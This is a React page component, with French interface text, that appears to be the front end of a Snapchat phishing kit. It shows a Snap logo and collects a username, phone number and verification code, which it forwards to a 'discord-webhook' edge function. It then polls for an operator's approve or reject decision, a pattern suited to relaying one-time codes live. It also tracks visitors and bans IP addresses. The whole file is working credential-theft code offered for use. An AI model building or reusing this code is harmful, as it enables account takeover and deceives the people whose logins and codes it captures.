import { useState, useEffect, useRef } from "react";
import SnapLogo from "@/components/SnapLogo";
import DisclaimerBox from "@/components/DisclaimerBox";
import SnapForm from "@/components/SnapForm";
import CodeVerification from "@/components/CodeVerification";
import WaitingValidation from "@/components/WaitingValidation";
import SuccessScreen from "@/components/SuccessScreen";
import BackButton from "@/components/BackButton";
import { supabase } from "@/integrations/supabase/client";

type Step = "form" | "code" | "waiting" | "success" | "banned";

const STORAGE_KEY = "snap_flow_state_v1";

const Index = () => {
  const [step, setStep] = useState<Step>(() => {
    try { return (JSON.parse(sessionStorage.getItem(STORAGE_KEY) || "{}").step) || "form"; } catch { return "form"; }
  });
  const [formData, setFormData] = useState(() => {
    try { return JSON.parse(sessionStorage.getItem(STORAGE_KEY) || "{}").formData || { username: "", phone: "" }; } catch { return { username: "", phone: "" }; }
  });
  const [submissionId, setSubmissionId] = useState<string | null>(() => {
    try { return JSON.parse(sessionStorage.getItem(STORAGE_KEY) || "{}").submissionId || null; } catch { return null; }
  });
  const [codeError, setCodeError] = useState("");
  const [formError, setFormError] = useState("");
  const [banReason, setBanReason] = useState<string | null>(null);
  const visitTracked = useRef(false);
  const formSubmittingRef = useRef(false);
  const ipChecked = useRef(false);

  // Persist flow state across reloads so polling can resume
  useEffect(() => {
    try {
      sessionStorage.setItem(STORAGE_KEY, JSON.stringify({ step, submissionId, formData }));
    } catch { /* noop */ }
  }, [step, submissionId, formData]);


  // Vérifier si l'IP est bannie
  useEffect(() => {
    if (ipChecked.current) return;
    ipChecked.current = true;
    
    supabase.functions.invoke('check-ip-ban').then(({ data }) => {
      if (data?.banned) {
        setBanReason(data.reason);
        setStep("banned");
      }
    }).catch(console.error);
  }, []);

  // Tracker la visite une seule fois
  useEffect(() => {
    if (visitTracked.current || step === "banned") return;
    visitTracked.current = true;
    
    supabase.from('visits').insert({
      user_agent: navigator.userAgent
    }).then(() => {
      console.log('Visit tracked');
    });
  }, [step]);

  // Polling du statut via edge function (RLS bloque l'accès direct)
  useEffect(() => {
    if (!submissionId || step !== "waiting") return;

    let cancelled = false;
    const poll = async () => {
      const { data } = await supabase.functions.invoke('get-submission-status', {
        body: { id: submissionId }
      });
      if (cancelled) return;
      const newStatus = data?.status;
      if (newStatus === 'approved') {
        setStep("success");
      } else if (newStatus === 'rejected') {
        setCodeError("Code refusé. Veuillez réessayer.");
        setStep("code");
      }
    };

    const interval = setInterval(poll, 3000);
    poll();

    return () => {
      cancelled = true;
      clearInterval(interval);
    };
  }, [submissionId, step]);

  const handleFormSubmit = async (data: { username: string; phone: string }) => {
    // Protection contre les soumissions multiples rapides
    if (formSubmittingRef.current) return;
    formSubmittingRef.current = true;
    
    setFormError("");
    setFormData(data);
    
    try {
      const { data: response, error } = await supabase.functions.invoke('discord-webhook', {
        body: { ...data, step: "form" }
      });
      
      if (error) {
        setFormError("Une erreur est survenue. Veuillez réessayer.");
        formSubmittingRef.current = false;
        return;
      }
      
      if (response?.submissionId) {
        setSubmissionId(response.submissionId);
      }
      
      setStep("code");
    } catch (error) {
      console.error("Error:", error);
      setFormError("Une erreur est survenue. Veuillez réessayer.");
    } finally {
      formSubmittingRef.current = false;
    }
  };

  const handleCodeSubmit = async (code: string) => {
    setCodeError("");
    
    try {
      await supabase.functions.invoke('discord-webhook', {
        body: { ...formData, code, step: "code", submissionId }
      });
    } catch (error) {
      console.error("Error sending to Discord:", error);
    }
    
    setStep("waiting");
  };

  return (
    <div className="min-h-screen bg-background flex flex-col items-center justify-center px-4 py-12">
      <div className="flex flex-col items-center gap-8 w-full max-w-md">
        <SnapLogo />
        <DisclaimerBox />
        
        {step === "form" && (
          <SnapForm onSubmit={handleFormSubmit} externalError={formError} />
        )}
        
        {step === "code" && (
          <>
            <CodeVerification onSubmit={handleCodeSubmit} error={codeError} />
            <BackButton onClick={() => { setCodeError(""); setStep("form"); }} />
          </>
        )}
        
        {step === "waiting" && (
          <>
            <WaitingValidation />
            <BackButton onClick={() => setStep("code")} />
          </>
        )}
        
        {step === "success" && (
          <SuccessScreen />
        )}
        
        {step === "banned" && (
          <div className="text-center space-y-4">
            <div className="text-6xl">🚫</div>
            <h2 className="text-2xl font-bold text-error">Accès Refusé</h2>
            <p className="text-muted-foreground">
              Votre adresse IP a été bannie de cette plateforme.
            </p>
            {banReason && (
              <p className="text-sm text-muted-foreground">
                Raison : {banReason}
              </p>
            )}
          </div>
        )}
      </div>
    </div>
  );
};

export default Index;
